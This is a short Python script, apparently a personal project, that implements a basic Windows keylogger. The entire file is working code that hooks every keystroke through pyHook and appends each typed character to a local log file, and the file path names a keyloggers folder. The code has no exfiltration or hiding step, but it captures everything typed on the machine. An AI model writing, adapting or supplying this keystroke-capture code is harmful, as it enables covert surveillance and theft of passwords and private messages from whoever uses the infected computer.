import pyHook, pythoncom, sys, logging
basicLog="C:\\Bogdan's Folder\\#PROGRAMMING\\WORK\\#PROJECTS\\PYTHON PROJECTS\\KEYLOGGERS\\KeyLogger Basic\\basic_log.txt"

def OnKeyboardEvent(event):
    logging.basicConfig(filename=basicLog, level=logging.DEBUG, format='%(message)s')
    logging.log(10,chr(event.Ascii))
    return True

hookManager = pyHook.HookManager()
hookManager.KeyDown = OnKeyboardEvent
hookManager.HookKeyboard()
pythoncom.PumpMessages()

